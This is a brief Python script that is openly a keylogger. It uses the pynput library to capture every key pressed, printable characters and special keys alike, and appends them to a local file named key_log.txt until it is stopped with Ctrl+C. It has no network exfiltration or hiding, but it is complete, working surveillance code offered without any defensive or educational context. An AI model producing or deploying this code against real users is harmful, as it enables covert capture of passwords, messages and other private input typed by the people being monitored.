from pynput.keyboard import Listener

# Path to the log file
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            # Write the key pressed to the file
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (like space, enter) are written in a readable format
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def main():
    print("Keylogger is running... Press 'Ctrl + C' to stop.")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
